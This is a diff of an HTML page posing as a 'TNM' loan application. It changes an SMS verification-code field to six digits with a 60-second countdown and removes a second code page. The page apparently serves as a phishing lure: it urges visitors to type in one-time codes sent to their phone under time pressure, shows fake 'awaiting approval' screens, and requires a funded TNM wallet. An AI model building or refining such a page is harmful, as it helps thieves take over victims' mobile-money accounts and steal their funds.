@@ -60,24 +60,14 @@ Apply Now | Simple Repayments | Fast Processing.</span>
     <div class="hero"><div class="icon"><span aria-hidden="true">🔢</span></div><h1>Code 1 — Application Verification</h1><p>Enter your code.</p></div>
     <div class="card form-card">
       <label for="firstName"> Code </label>
-      <input id="firstName" class="text-input" type="text" inputmode="numeric" pattern="[0-9]{4,6}" maxlength="6" minlength="4" autocomplete="off" placeholder="Enter 4–6 digits" aria-label="Reference Code 1">
-      <div class="hint">expired in 30 seconds
-Enter the verification code sent to your phone via SMS. The code expires in 30 seconds. Please enter it before it expires.</div>
-      <div class="submission-timer" id="firstNameTimer"><div class="countdown-ring" id="firstNameRing" style="--progress:100%"><div class="countdown-ring-inner"><strong id="firstNameSeconds">30</strong><span>SEC</span></div></div><div class="countdown-label">Time remaining to submit</div></div>
+      <input id="firstName" class="text-input" type="text" inputmode="numeric" pattern="[0-9]{4,6}" maxlength="6" minlength="6" autocomplete="off" placeholder="Enter 6 digits" aria-label="Reference Code 1">
+      <div class="hint">expired in 60 seconds
+Enter the verification code sent to your phone via SMS. The code expires in 60 seconds. Please enter it before it expires.</div>
+      <div class="submission-timer" id="firstNameTimer"><div class="countdown-ring" id="firstNameRing" style="--progress:100%"><div class="countdown-ring-inner"><strong id="firstNameSeconds">60</strong><span>SEC</span></div></div><div class="countdown-label">Time remaining to submit</div></div>
       <button class="primary" id="firstNameBtn" type="button">SUBMIT CODE 1 <span>→</span></button><button class="secondary hidden" id="firstNameResubmit" type="button">RESUBMIT ↻</button>
       <div class="waiting hidden" id="firstNameWaiting"><div class="spinner"></div><strong>Waiting for loan Code 1 approval</strong><span>Reference Code 1 has been submitted. The next page will open after tnm loan code approval.</span></div><div class="error hidden" id="page2Error"></div>
     </div>
   </section>
-  <section class="page" data-page="3">
-    <div class="hero"><div class="icon"><span aria-hidden="true">🔢</span></div><h1> Code 2 — Final Verification</h1><p>Enter your second code verification.</p></div>
-    <div class="card form-card">
-      <label for="secondName"> Code 2 </label><input id="secondName" class="text-input" type="text" inputmode="numeric" pattern="[0-9]{4,6}" maxlength="6" minlength="4" autocomplete="off" placeholder="Enter 4–6 digits" aria-label="verification Code 2">
-      <div class="hint">expired in 30 seconds
-Enter the verification code sent to your phone via SMS. The code expires in 30 seconds. Please enter it before it expires.</div>
-      <div class="submission-timer" id="secondNameTimer"><div class="countdown-ring" id="secondNameRing" style="--progress:100%"><div class="countdown-ring-inner"><strong id="secondNameSeconds">30</strong><span>SEC</span></div></div><div class="countdown-label">Time remaining to submit</div></div>
-      <button class="primary" id="secondNameBtn" type="button">SUBMIT CODE 2 <span>→</span></button><button class="secondary hidden" id="secondNameResubmit" type="button">RESUBMIT ↻</button>
-      <div class="waiting hidden" id="secondNameWaiting"><div class="spinner"></div><strong>Waiting for Code 2 approval</strong><span> Code 2 has been submitted. Please wait for tnm loan administrator approval.</span></div><div class="error hidden" id="page3Error"></div>
-    </div>
   </section> <section class="page" data-page="4"> <div class="hero"><div class="icon"><span aria-hidden="true">🔐</span></div><h1>Loan Summary</h1> <p>Review your loan amount and estimated repayments before submitting.</p></div> <div class="card form-card"> <div class="hint" id="finalLoanSummary">Your loan amount and repayment summary will appear here.</div><input id="loanAmount" type="hidden" value="100000"><div class="hint">Your loan will be disbursed directly to your TNM account, subject to meeting the loan eligibility requirements. Eligibility is determined by your account activity, including a transaction history of at least 50,000 or a TNM wallet balance of 50,000 or above at the time of application.</div> <button class="primary" id="loanAmountBtn">SUBMIT LOAN APPLICATION <span>→</span></button> <div class="waiting hidden" id="loanAmountWaiting"><div class="spinner"></div><strong>Waiting for the loan application decision</strong><span>application details have been submitted for tnm smaert loan review.</span></div> <div class="error hidden" id="page4Error"></div> </div> </section> <section class="page" data-page="success"> <div class="success-card"> <div class="big-check">✓</div> <h1>Congratulations!</h1> <p> Your loan application for <strong id="successAmount">—</strong> Your loan amount is expected to be disbursed to your TNM account within 24 hours, subject to meeting the loan eligibility requirements.
 
 Important Eligibility Requirements:
